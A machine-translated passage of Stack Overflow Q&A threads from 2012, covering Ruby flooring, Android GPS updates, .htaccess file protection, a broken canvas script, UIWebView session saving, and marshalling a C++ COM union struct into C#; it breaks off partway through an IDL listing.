> 时间：2012-09-28T19:54:13.107

使用地板功能。它给出的第一个整数小于或等于您输入的任何数字。

```
1.9.3-p194 :003 > i = 246.54
  => 246.54 
1.9.3-p194 :004 > i.floor
  => 246 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-07T14:44:29.280

```
if mynumber >= 0 then 
    mynumber = mynumber.floor
else
    mynumber = 0 - mynumber
    mynumber = mynumber.floor
    mynumber = 0 - mynumber
end 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-28T19:58:01.043

您可以在 ruby​​ 中进行舍入：

`246.54 .to_nearest_i`

# android - Gps On App 仅在使用 Google 地图后有效

> ID：12646477
> 
> 赞同：4
> 
> 时间：2012-09-28T19:50:25.497
> 
> 标签：android, google-maps, gps

我们有这个使用地图 api 的 android 应用程序。现在当我们运行它时，它通常不起作用，当我们调用时

```
locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
100, 0, this, null); 
```

它实际上不起作用，永远不会调用 LocationListener 的 onLocationChanged 方法。但是，如果我们运行 Google 地图并等到状态栏中的 gps 图标打开，那么我们的应用程序确实会开始调用 onLocationChanged。所以我的问题是，谷歌地图是如何“激活”全球定位系统的，或者如果他们没有激活它，他们在做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:53:24.540

您需要先打开 GPS：

```
try {
  Settings.Secure.setLocationProviderEnabled(getContentResolver(), LocationManager.GPS_PROVIDER, true);
} catch (Exception e) {
  logger.log(Log.ERROR, e, e.getMessage());
} 
```

为此，我相信您还需要获得最终用户的许可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:53:49.863

试试这个：- 当我们提供 locationlitener 时，我们必须使用 locationManager.onLocationChanged 方法注册位置监听器

```
 locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
 100, 0, this, locationlistener); 
```

# file - 如何使用 .htaccess 限制对一个或多个文件的访问？

> ID：12646478
> 
> 赞同：1
> 
> 时间：2012-09-28T19:50:26.850
> 
> 标签：file, .htaccess, webserver

我想使用 .htaccess 文件限制对一个或多个文件的访问。基本上，没有人应该能够使用文件的直接链接来下载文件。但是，应该可以从我的网站访问该文件。

例如，假设我有一个名为 Presentation.ppt 的文件。我希望访问者可以通过我的网站访问它，但如果他们尝试下载它或使用直接链接访问它，那么服务器应该拒绝该请求。

是否可以使用.htaccess 来做到这一点？

先感谢您，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:00:33.320

您可以拒绝访问每个 IPA 的目录，但服务器的：

```
<Directory /dir/of/presentation>
    Order Allow,Deny
    Allow from 127.0.0.1
    Deny from All
</Directory> 
```

正如你所指出的那样，那个笨蛋的工作。

将 Mod Rewrite 与将 /dir/of/presentation/* 映射到禁止页面的规则一起使用怎么样。这样直接链接就不行了。请求`http://site/content/presentation.ppt`
可能被重定向到`http://site/forbidden.html`

在内部，您可以创建一个链接以`http://authorizedRequest/presentation.ppt`映射到`http://site/content/presentation.ppt`

这只是通过默默无闻的安全。它不会阻止任何人直接在他们的浏览器中输入你的“秘密”URI。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:02:25.500

> 例如，假设我有一个名为 Presentation.ppt 的文件。我希望访问者可以通过我的网站访问它，但如果他们尝试下载它或使用直接链接访问它，那么服务器应该拒绝该请求。
> 
> 是否可以使用.htaccess 来做到这一点？

这是可能的，但有办法绕过它。您需要检查浏览器发送的引荐来源网址，但任何人都可以欺骗，有时浏览器可能会选择不包含引荐来源网址。

如果您尝试保护文件`Presentation.ppt`，请将这些规则放在文档根目录的 htaccess 文件中：

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !^(https?://)?your_website.com
RewriteRule ^/?path/to/Presentation.ppt - [L,F] 
```

如果要保护文件夹`/path/images/`，则：

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !^(https?://)?your_website.com
RewriteRule ^/?path/images - [L,F] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-02T14:45:26.460

谢谢大家的答案。我已经尝试了你所有的建议，但我仍然无法让它发挥作用。但是，我确实想出了一个可行的解决方案。

**第 1 步：**通过删除单词索引来禁用或关闭Web 服务器上的**选项索引，使其他所有内容保持不变。**在某些情况下，您可以使用 .htaccess 文件执行此操作。如果您无法使用 .htaccess 执行此操作，那么您将不得不在您的服务器中查找 httpd.conf 文件。它通常位于 etc/apache/httpd.conf 或 etc/httpd/conf/httpd.conf。找到它后，在其中关闭此选项。

**第 2 步：**在您的网页文件夹中创建一个文件夹，然后随意命名，但要确保它不容易被猜到或很明显（即 Joe33CompanyOCT2MeBoss）。然后，将您想要隐藏或保护访问者的文件移动到此文件夹中。

**第 3 步：**在 robots.txt 文件中，通过输入“禁止您的文件夹名称”来禁止所有机器人或爬虫索引您的文件夹或该文件夹中的文件。

**第 4 步：**然后您必须使用下面的类似代码创建一个 PHP 文件。下面的代码将强制下载。

```
 $File1 = 'http://yourwebsite.com/Joe33CompanyOCT2MeBoss/Presentation.ppt';
        header("Content-Disposition: attachment; filename=\"".basename($File1)."\"");
        header("Content-Type: application/force-download");
        ob_end_clean();
        flush();
        readfile($File1);
        exit; 
```

这种方式文件的直接路径对您的访问者隐藏，即使他们可以直接下载文件，他们也不知道文件的实际 URL，因为强制下载 php 代码不会显示文件的实际路径。所以，现在我网站的访问者必须通过我的网页下载这个文件，而不是直接下载。

以下 stackoverflow 问题对帮助我解决编程问题非常有帮助。谢谢，

[如何在 PHP 中自动开始下载？](https://stackoverflow.com/questions/40943/how-to-automatically-start-a-download-in-php)

[php文件强制下载](https://stackoverflow.com/questions/9948178/php-file-force-download)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T20:00:21.800

最简单的（虽然不是防弹的）是在 HTTP_REFERER 不正确时重定向用户代理。这可以在服务器配置中使用 mod_rewrite 或（第二选择）在 .htaccess 类文件中完成。它有助于防止简单的热链接（通过 url 引用您的文件的链接）。

您应该阅读 moapaches d_rewrite 的详细文档。

# javascript - 这个 javascript 和 canvas 代码有什么问题？

> ID：12646483
> 
> 赞同：0
> 
> 时间：2012-09-28T19:50:53.037
> 
> 标签：javascript

教程：[http](http://thecodeplayer.com/walkthrough/make-gauge-charts-using-canvas-and-javascript) ://thecodeplayer.com/walkthrough/make-gauge-charts-using-canvas-and-javascript 定制（工作）：http: [//jsfiddle.net/lewisgoddard/JyGkQ/29/](http://jsfiddle.net/lewisgoddard/JyGkQ/29/)
查看（不工作）：[http://gamesforubuntu.org/review/review/show/hedgewars](http://gamesforubuntu.org/review/review/show/hedgewars)

在我关闭脚本时（在完成的页面中），Chrome 会抛出错误：

```
Uncaught SyntaxError: Unexpected token ILLEGAL 
```

我真的不知道出了什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:55:16.137

`</script>`和你的最后一个右括号之间有一个不可见的字符。看看最后一行：

```
<script type="text/javascript" language="javascript">
window.onload = function(){
  // Canvas Initialization
    var canvas = document.getElementById("Performance"); // Get the canvas by ID
    var ctx = canvas.getContext("2d"); // Make it Flat
    // Dimensions
    var W = canvas.width; // Get the Width
    var H = canvas.height; // Get the Height
    //Variables
    var degrees = 0; // Start Position
    var percent = 93; // End Position
    var new_degrees = Math.round((percent+1)*360/100); // Figure out how far to go
    var difference = 0; // Set the Default Difference

//   Blue     19B6EE   BAE9FA
//   Green    38B44A   C3E8C9
//   Yellow   EFB73E   FAE9C5
//   Red      DF382C   F5C3C0
    if (percent<30) {
        var color = "#DF382C"; // Red
        var bgcolor = "#F5C3C0"; 
    } else if (percent<60) {
        var color = "#EFB73E"; // Yellow
        var bgcolor = "#FAE9C5";
    } else if (percent<90) {
        var color = "#38B44A"; // Green
        var bgcolor = "#C3E8C9";
    } else {
        var color = "#19B6EE"; // Blue
        var bgcolor = "#BAE9FA";
    }

    var text;
    var animation_loop, redraw_loop;

    function init()
    {
        //Clear the canvas everytime a chart is drawn
        ctx.clearRect(0, 0, W, H);

        //Background 360 degree arc
        ctx.beginPath();
        ctx.strokeStyle = bgcolor;
        ctx.lineWidth = 30;
        ctx.arc(W/2, H/2, 100, 0, Math.PI*2, false); //you can see the arc now
        ctx.stroke();

        //gauge will be a simple arc
        //Angle in radians = angle in degrees * PI / 180
        var radians = degrees * Math.PI / 180;
        ctx.beginPath();
        ctx.strokeStyle = color;
        ctx.lineWidth = 30;
        //The arc starts from the rightmost end. If we deduct 90 degrees from the angles
        //the arc will start from the topmost end
        ctx.arc(W/2, H/2, 100, 0 - 90*Math.PI/180, radians - 90*Math.PI/180, false); 
        //you can see the arc now
        ctx.stroke();

        //Lets add the text
        ctx.fillStyle = color;
        ctx.font = "50px";
        text = Math.floor(degrees/360*100) + "%";
        //Lets center the text
        //deducting half of text width from position x
        text_width = ctx.measureText(text).width;
        //adding manual value to position y since the height of the text cannot
        //be measured easily. There are hacks but we will keep it manual for now.
        ctx.fillText(text, W/2 - text_width/2, H/2 + 15);
    }

    function draw()
    {
        //Cancel any movement animation if a new chart is requested
        if(typeof animation_loop != undefined) clearInterval(animation_loop);

        //random degree from 0 to 360
        difference = new_degrees - degrees;
        //This will animate the gauge to new positions
        //The animation will take 1 second
        //time for each frame is 1sec / difference in degrees
        animation_loop = setInterval(animate_to, 1000/difference);
    }

    //function to make the chart move to new degrees
    function animate_to()
    {
        //clear animation loop if degrees reaches to new_degrees
        if(degrees == new_degrees) 
            clearInterval(animation_loop);

        if(degrees < new_degrees)
            degrees++;
        else
            degrees--;

        init();
    }

    draw();
}
<- Here was your enemy!</script> 
```

# iphone - 保存和恢复 UIWebView 浏览会话

> ID：12646487
> 
> 赞同：1
> 
> 时间：2012-09-28T19:51:10.610
> 
> 标签：iphone, ios, browser, uiwebview, webkit

使用 UIWebView 类，是否可以在应用程序进入后台时保存浏览会话，然后在应用程序重新激活或重新启动时完全恢复它？根据文档，UIWebView 类确实符合 NSCoding 协议，但归档 UIWebView 类的实例也会保留页面的 cookie**和**JavaScript 状态（也可能是 HTML5 本地存储），以便页面以相同的方式恢复外观和功能完全相同？我的应用程序查看的页面包含大量分散的图形和 JavaScript，这些页面在蜂窝网络上加载时间过长，因此保存浏览会话将是一个非常非常好的改进。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-04T05:23:25.873

可能不是。甚至 Safari 也不这样做。

所有 UIView 类都符合 NSCoding 以支持从 nib 文件取消归档，以设置用户界面。这是一种特殊情况，而不是其他类存在的通用归档/取消归档机制。

您可能可以做一些事情：

*   保存并恢复滚动位置。
*   积极缓存数据；查看 URL 加载系统的文档，这是 UIWebView 使用的。默认情况下它会做一些缓存，但我相信你可以调整它来做更多的事情。
*   保存和恢复会话 cookie，它们通常会被丢弃（参见 HTTPCookieStorage）。

# c# - 如何通过 Visual Studio COM 包装器（或其他方式）在 C# 中使用 C++ 属性联合

> ID：12646488
> 
> 赞同：2
> 
> 时间：2012-09-28T19:51:10.207
> 
> 标签：c#, c++, com, pinvoke

我正在尝试使用制造商提供的 com/dlls（用 c++ 编写）与设备通信，但是我遇到了一个问题，即我无法在结构中设置字段的值。

在 C++ 中，根据提供的文档，这个结构体是这样实现的：

```
typedef struct tagFCITEST
{
  FCITESTTYPE TestType;
  [switch_type( FCITESTTYPE ), switch_is( TestType )]
  union
  {
    [case(FCI_TYPE_PROPORTIONAL)] FCI_TEST_PROPORTIONAL Test;
    [case(FCI_TYPE_SWITCH)] FCI_TEST_SWITCH SwitchTest;
    [default];
  };
} FCITEST; 
```

但是，当我在 Visual Studio 中“转到定义”时，我发现以下内容：

```
public struct tagFCITEST
{
    public __MIDL___MIDL_itf_mftFCINTF_0209_0005 __MIDL_0022;
    public tagFCITESTTTYPE TestType;
} 
```

和

```
public struct __MIDL___MIDL_itf_mftFCINTF_0209_0005
{
} 
```

显然 C# 不支持这些类型的联合，并且看起来 Visual Studio 在创建包装器时搞砸了，所以我尝试了以下方法来解决这个问题：

```
 public struct tagFCITEST
    {
        public MFTFCINTFLib.tagFCITESTTTYPE TestType;
        public __MIDL___MIDL_itf_mftFCINTF_0209_0005 __MIDL_0022;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct __MIDL___MIDL_itf_mftFCINTF_0209_0005
    {
        [FieldOffset(0)]
        public MFTFCINTFLib.tagFCI_TEST_PROPORTIONAL Test;
        [FieldOffset(0)]
        public MFTFCINTFLib.tagFCI_TEST_SWITCH SwitchTest;
    } 
```

如果我在方法调用中使用我的自定义结构，编译器会不高兴，并告诉我存在无效的争论。即使我要创建自定义方法签名：

```
 [DllImport("mftFCINTF.dll")]
    public static extern void DownloadTag(int ISessionID,
        string szwDeviceTag,
        string szwDeviceSeriaINum,
        ref MFTFCINTFLib.tagFCICOMMDEF pCommDef,
        ref MFTFCINTFLib.tagFCIDEVIN pInputDef,
        ref MFTFCINTFLib.tagFCIDEVOUT pOutputDef,
        ref MFTFCINTFLib.tagFCIDEVRELATION pRelationDef,
        ref tagFCITEST pTestDef,        // This is the changed line
        string szwSetupInstructions,
        string szwCleanupInstructions,
        out string pszwLocationInCalibrator,
        out MFTFCINTFLib.tagFCISTATUS pStatus); 
```

不使用签名。有没有办法修改 Visual Studio 的包装器实现？或者也许有更好的方法来解决这个问题？

谢谢！

编辑：

这是生成的 .IDL 文件

```
// Generated .IDL file (by the OLE/COM Object Viewer)
// 
// typelib filename: mftFCINTF.dll

[
  uuid(C81FC550-84AC-437B-AD0E-DA283ACE4687),
  version(1.0),
  helpstring("mftFCINTF 1.0 Type Library"),
  custom(DE77BA64-517C-11D1-A2DA-0000F8773CE9, 83951780),
  custom(DE77BA63-517C-11D1-A2DA-0000F8773CE9, 1058814716)

]
library MFTFCINTFLib
{
    // TLib :     // TLib : OLE Automation : {00020430-0000-0000-C000-000000000046}
    importlib("stdole2.tlb");

    // Forward declare all types defined in this typelib
    interface ICalibratorInfo;
    interface ICalibratorDownload;
    interface ICalibratorUpload;
    interface IConfigurator;

    [
      uuid(34E98744-678E-4D9A-B57F-6A96521BB609),
      helpstring("MFT 1.0 by Meriam Process Technologies")
    ]
    coclass mftFCI {
        [restricted] interface ICalibratorInfo;
        [restricted] interface ICalibratorDownload;
        [restricted] interface ICalibratorUpload;
        [restricted] interface IConfigurator;
    };

    [
      odl,
      uuid(FF5EFD41-7B15-11D1-B326-00001CBE02AA),
      version(1.0),
      helpstring("ICalibratorInfo Interface")
    ]
    interface ICalibratorInfo : IUnknown {
        HRESULT _stdcall DriverProperties([out] tagFCISTATUS* pStatus);
        HRESULT _stdcall Open(
                        [in] int nPortNumber, 
                        [out] long* plSessionId, 
                        [out] long* plCapabilities, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall Close(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall Properties(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall GetId(
                        [in] long lSessionId, 
                        [out] LPWSTR* pszwCalManufacturer, 
                        [out] LPWSTR* pszwCalModel, 
                        [out] LPWSTR* pszwCalSerialNum, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall GetCalDates(
                        [in] long lSessionId, 
                        [out] _SYSTEMTIME* pLastCalDate, 
                        [out] _SYSTEMTIME* pNextCalDueDate, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall SetDateAndTime(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall SetTempStandard(
                        [in] long lSessionId, 
                        [in] int nTemperatureStd, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall GetTestResultsCount(
                        [in] long lSessionId, 
                        [out] int* pnCount, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall ClearMemory(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall ValidateTag(
                        [in] tagFCICOMMDEF* pCommDef, 
                        [in] tagFCIDEVIN* pInputDef, 
                        [in] tagFCIDEVOUT* pOutputDef, 
                        [in] tagFCIDEVRELATION* pRelationDef, 
                        [in] tagFCITEST* pTestDef, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall GetSensorModuleId(
                        [in] long lSessionId, 
                        long nSensorIndex, 
                        [out] LPWSTR* pszwCalManufacturer, 
                        [out] LPWSTR* pszwCalModel, 
                        [out] LPWSTR* pszwCalSerialNum, 
                        [out] LPWSTR* pszwCalDate, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall ClearCalFatEntry(
                        [in] long nIndex, 
                        [out, retval] VARIANT_BOOL* pResult);
        HRESULT _stdcall SetAppDriverMode([in] long nMode);
    };

    typedef enum {
        FCI_OK = 0,
        FCI_FAILED = 1,
        FCI_COMM_ERROR = 2,
        FCI_REVISION_ERROR = 3,
        FCI_CANCELED = 4,
        FCI_NOT_SUPPORTED = 5,
        FCI_ALREADY_OPEN = 6,
        FCI_WRONG_SESSION = 7,
        FCI_WRONG_CALIBRATOR = 8,
        FCI_ERR_IN_RANGE = 9,
        FCI_ERR_IN_UNITS = 10,
        FCI_ERR_IN_TYPE = 11,
        FCI_ERR_IN_MANUAL = 12,
        FCI_ERR_OUT_RANGE = 13,
        FCI_ERR_OUT_UNITS = 14,
        FCI_ERR_OUT_TYPE = 15,
        FCI_ERR_OUT_MANUAL = 16,
        FCI_ERR_INOUT = 17,
        FCI_ERR_RELATION = 18,
        FCI_ERR_PROBE = 19,
        FCI_ERR_CJC = 20,
        FCI_ERR_ENUM = 21,
        FCI_ERR_RESOURCE = 22,
        FCI_ERR_TESTPOINT = 23,
        FCI_ERR_TESTTYPE = 24,
        FCI_ERR_POWER = 25,
        FCI_ERR_TAG = 26,
        FCI_MEM_FULL = 27,
        FCI_MEM_EMPTY = 28,
        FCI_MEM_HAS_DATA = 29,
        FCI_END_OF_UPLOAD = 30,
        FCI_ERR_DOWNLOAD = 31,
        FCI_ERR_TAGLENGTH = 32,
        FCI_ERR_SNLENGTH = 33,
        FCI_ERR_MAXPOINTS = 34,
        FCI_END = 35
    } tagFCISTATUS;

    typedef struct tag_SYSTEMTIME {

unsigned short wYear;

unsigned short wMonth;

unsigned short wDayOfWeek;

unsigned short wDay;

unsigned short wHour;

unsigned short wMinute;

unsigned short wSecond;

unsigned short wMilliseconds;
    } _SYSTEMTIME;

    typedef struct tagtagFCICOMMDEF {

tagFCICOMMTYPE CommType;

__MIDL___MIDL_itf_mftFCINTF_0209_0001 __MIDL_0016;
    } tagFCICOMMDEF;

    typedef enum {
        FCI_COMMTYPE_NONE = 1,
        FCI_COMMTYPE_HART = 2
    } tagFCICOMMTYPE;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0001 {

tagFCI_COMMDEF_HART HartData;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0001;

    typedef struct tagtagFCI_COMMDEF_HART {

unsigned char cBlockId;

unsigned char cURev;

unsigned char cPollAddr;

unsigned char acUid[5];

unsigned char acTag[6];

unsigned char acDescriptor[12];

unsigned char acDate[3];

unsigned char acMessage[24];
    } tagFCI_COMMDEF_HART;

    typedef struct tagtagFCIDEVIN {

tagFCIBLOCKTYPE DevType;

__MIDL___MIDL_itf_mftFCINTF_0209_0002 __MIDL_0017;
    } tagFCIDEVIN;

    typedef enum {
        FCI_BLKTYPE_GENERIC = 1,
        FCI_BLKTYPE_TEMP_RTD = 2,
        FCI_BLKTYPE_TEMP_TC = 3,
        FCI_BLKTYPE_FREQUENCY = 4,
        FCI_BLKTYPE_PRESSURE = 5,
        FCI_BLKTYPE_TEMP_MEASRTD = 6,
        FCI_BLKTYPE_TEMP_MEASTC = 7,
        FCI_BLKTYPE_HART = 8,
        FCI_BLKTYPE_SWITCH = 9,
        FCI_BLKTYPE_DIFFTEMP = 10
    } tagFCIBLOCKTYPE;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0002 {

tagFCI_BLKDEF_PRESSURE PressureData;

tagFCI_BLKDEF_RTD TempRtdData;

tagFCI_BLKDEF_TC TempTcData;

tagFCI_BLKDEF_RTD TempMeasRtdData;

tagFCI_BLKDEF_TC TempMeasTcData;

tagFCI_BLKDEF_FREQUENCY FrequencyData;

tagFCI_BLKDEF_HART HartData;

tagFCI_BLKDEF_DIFFTEMP DiffTempData;

tagFCI_BLKDEF_GENERIC GenericData;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0002;

    typedef struct tagtagFCI_BLKDEF_PRESSURE {

single rURV;

single rLRV;

single rSettling;

unsigned short wUnits;

unsigned short wPressureType;
    } tagFCI_BLKDEF_PRESSURE;

    typedef struct tagtagFCI_BLKDEF_RTD {

single rURV;

single rLRV;

single rSettling;

unsigned short wUnits;

unsigned short wProbeType;

unsigned short wNumWires;

unsigned short wRESERVED;
    } tagFCI_BLKDEF_RTD;

    typedef struct tagtagFCI_BLKDEF_TC {

single rURV;

single rLRV;

single rSettling;

single rManualCJC;

unsigned short wUnits;

unsigned short wProbeType;

unsigned short wCJC;

unsigned short wProbeConnect;
    } tagFCI_BLKDEF_TC;

    typedef struct tagtagFCI_BLKDEF_FREQUENCY {

single rURV;

single rLRV;

single rSettling;

single rAmplitude;

unsigned short wUnits;

unsigned short wWaveForm;
    } tagFCI_BLKDEF_FREQUENCY;

    typedef struct tagtagFCI_BLKDEF_HART {

single rUSL;

single rLSL;

single rSettling;

unsigned short wUnits;
    } tagFCI_BLKDEF_HART;

    typedef struct tagtagFCI_BLKDEF_DIFFTEMP {

single rURV;

single rLRV;

single rSettling;

unsigned short wUnits;

unsigned short wDeviceVariable1;

unsigned short wDeviceVariable2;
    } tagFCI_BLKDEF_DIFFTEMP;

    typedef struct tagtagFCI_BLKDEF_GENERIC {

single rURV;

single rLRV;

single rSettling;

unsigned short wUnits;
    } tagFCI_BLKDEF_GENERIC;

    typedef struct tagtagFCIDEVOUT {

tagFCIBLOCKTYPE DevType;

__MIDL___MIDL_itf_mftFCINTF_0209_0003 __MIDL_0018;
    } tagFCIDEVOUT;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0003 {

tagFCI_BLKDEF_PRESSURE PressureData;

tagFCI_BLKDEF_RTD TempMeasRtdData;

tagFCI_BLKDEF_TC TempMeasTcData;

tagFCI_BLKDEF_FREQUENCY FrequencyData;

tagFCI_BLKDEF_HART HartData;

tagFCI_BLKDEF_SWITCH Switch;

tagFCI_BLKDEF_GENERIC GenericData;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0003;

    typedef struct tagtagFCI_BLKDEF_SWITCH {

unsigned short wContactType;

unsigned short wForm;

unsigned short wTripDirection;

single rWetContactVoltage;
    } tagFCI_BLKDEF_SWITCH;

    typedef struct tagtagFCIDEVRELATION {

tagFCIRELATIONTYPE RelType;

__MIDL___MIDL_itf_mftFCINTF_0209_0004 __MIDL_0020;
    } tagFCIDEVRELATION;

    typedef enum {
        FCI_RELTYPE_LINEAR = 0,
        FCI_RELTYPE_SQRT = 1,
        FCI_SQRT_3RD_PWR = 2,
        FCI_SQRT_5TH_PWR = 3,
        FCI_RELTYPE_TABLE = 4,
        FCI_RELTYPE_SWITCH = 230
    } tagFCIRELATIONTYPE;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0004 {

tagFCI_RELDEF_SQRT SqrtData;

tagFCI_RELDEF_TABLE TableData;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0004;

    typedef struct tagtagFCI_RELDEF_SQRT {

single rBreakPoint;
    } tagFCI_RELDEF_SQRT;

    typedef struct tagtagFCI_RELDEF_TABLE {

unsigned short wNumPoints;

unsigned short wInterpolate;

single rInput[30];

single rOutput[30];
    } tagFCI_RELDEF_TABLE;

    typedef struct tagtagFCITEST {

tagFCITESTTTYPE TestType;

__MIDL___MIDL_itf_mftFCINTF_0209_0005 __MIDL_0022;
    } tagFCITEST;

    typedef enum {
        FCI_TYPE_PROPORTIONAL = 1,
        FCI_TYPE_SWITCH = 2
    } tagFCITESTTTYPE;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0005 {

tagFCI_TEST_PROPORTIONAL Test;

tagFCI_TEST_SWITCH SwitchTest;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0005;

    typedef struct tagtagFCI_TEST_PROPORTIONAL {

unsigned short wRESERVED;

unsigned short wPowerSource;

unsigned short wCalSourceInput;

unsigned short wCalReadInput;

unsigned short wCalMeasureOutput;

unsigned short wNumTestPoints;

single arTestPoint[21];

single rTestPointTolerance;

single rAdjustmentLimit;

single rMaxErrorLimit;
    } tagFCI_TEST_PROPORTIONAL;

    typedef struct tagtagFCI_TEST_SWITCH {

single rTripSetPoint;

single rTripTolerance;

single rResetDeadband;

single rDeadbandTolerance;

single rRampTime;

long bTestReset;
    } tagFCI_TEST_SWITCH;

    [
      odl,
      uuid(FF5EFD42-7B15-11D1-B326-00001CBE02AA),
      version(1.0),
      helpstring("ICalibratorDownload Interface")
    ]
    interface ICalibratorDownload : IUnknown {
        HRESULT _stdcall StartDownloading(
                        [in] long lSessionId, 
                        [in] LPWSTR szSessionName, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall DownloadTag(
                        [in] long lSessionId, 
                        [in] LPWSTR szwDeviceTag, 
                        [in] LPWSTR szwDeviceSerialNum, 
                        [in] tagFCICOMMDEF* pCommDef, 
                        [in] tagFCIDEVIN* pInputDef, 
                        [in] tagFCIDEVOUT* pOutputDef, 
                        [in] tagFCIDEVRELATION* pRelationDef, 
                        [in] tagFCITEST* pTestDef, 
                        [in] LPWSTR szwSetupInstructions, 
                        [in] LPWSTR szwCleanupInstructions, 
                        [out] LPWSTR* pszwLocationInCalibrator, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall FinishDownloading(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall AbortDownload(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
    };

    [
      odl,
      uuid(FF5EFD43-7B15-11D1-B326-00001CBE02AA),
      version(1.0),
      helpstring("ICalibratorUpload Interface")
    ]
    interface ICalibratorUpload : IUnknown {
        HRESULT _stdcall StartUploading(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall UploadNextTag(
                        [in] long lSessionId, 
                        [out] LPWSTR* pszwLocationInCalibrator, 
                        [out] LPWSTR* pszwDeviceTag, 
                        [out] LPWSTR* pszwDeviceSerialNum, 
                        [out] LPWSTR* pszwTechnician, 
                        [out] LPWSTR* pszwServiceNote, 
                        [out] int* pnTemperatureStd, 
                        [out] tagFCICOMMDEF* pCommDef, 
                        [out] tagFCIRESULT* pAsFound, 
                        [out] tagFCIRESULT* pAsLeft, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall FinishUploading(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall AbortUpload(
                        [in] long lSessionId, 
                        [out] tagFCISTATUS* pStatus);
        HRESULT _stdcall PreviewNextTag(
                        [in] long lSessionId, 
                        [out] LPWSTR* pszwLocationInCalibrator, 
                        [out] LPWSTR* pszwDeviceTag, 
                        [out] LPWSTR* pszwDeviceSerialNum, 
                        [out] long* plRecordType, 
                        [out] _SYSTEMTIME* pDate, 
                        [out] tagFCISTATUS* pStatus);
    };

    typedef struct tagtagFCIRESULT {

tagFCITESTTTYPE ResultType;

__MIDL___MIDL_itf_mftFCINTF_0209_0006 __MIDL_0024;
    } tagFCIRESULT;

    typedef union tag__MIDL___MIDL_itf_mftFCINTF_0209_0006 {

tagFCI_RESULT_PROPORTIONAL Results;

tagFCI_RESULT_SWITCH SwitchResults;
    } __MIDL___MIDL_itf_mftFCINTF_0209_0006;

    typedef struct tagtagFCI_RESULT_PROPORTIONAL {

double dInputLowerRangeValue;

double dInputUpperRangeValue;

int nInputRangeUnits;

double dOutputLowerRangeValue;

double dOutputUpperRangeValue;

int nOutputRangeUnits;

int nRelationship;

int nNumberOfTestPoints;

double adInput[21];

double adOutput[21];

LPWSTR szwAuxEquipManufacturer;

LPWSTR szwAuxEquipModel;

LPWSTR szwAuxEquipSerialNum;

double dAmbientTemperature;

int nAmbientTemperatureUnits;

_SYSTEMTIME TestDate;
    } tagFCI_RESULT_PROPORTIONAL;

    typedef struct tagtagFCI_RESULT_SWITCH {

unsigned short wUnits;

single rTripPoint;

single rResetPoint;

unsigned short bResetTested;

_SYSTEMTIME TestDate;

LPWSTR szwAuxEquipManufacturer;

LPWSTR szwAuxEquipModel;

LPWSTR szwAuxEquipSerialNum;
    } tagFCI_RESULT_SWITCH;

    [
      odl,
      uuid(084ABD42-30CE-49AD-B1FA-9C869AAD2A27),
      version(1.0),
      helpstring("IConfigurator Interface")
    ]
    interface IConfigurator : IUnknown {
        [helpstring("method UploadConfiguration")]
        HRESULT _stdcall UploadConfiguration(
                        long* pDataAvailabe, 
                        BSTR bstrFilePath, 
                        [in, out] BSTR* pbstrTag, 
                        [in, out] long* plDof, 
                        [in, out] long* plAsFoundAsLeft, 
                        [in, out] long* pnLocation, 
                        [in, out] long* pnMultivar, 
                        [in, out] BSTR* pbstrDeviceSerialNum, 
                        [out, retval] VARIANT_BOOL* pResult);
        [helpstring("method DownloadConfiguration")]
        HRESULT _stdcall DownloadConfiguration(
                        [in] BSTR bstrFilePath, 
                        [in, out] long* pnLocation, 
                        [out, retval] VARIANT_BOOL* pResult);
        [helpstring("method ClearConfiguratorMemory")]
        HRESULT _stdcall ClearConfiguratorMemory();
        [helpstring("method GetConfigCount")]
        HRESULT _stdcall GetConfigCount([out, retval] long* lCount);
        [helpstring("method PreviewConfiguration")]
        HRESULT _stdcall PreviewConfiguration(
                        long* pDataAvailabe, 
                        [in, out] BSTR* pbstrTag, 
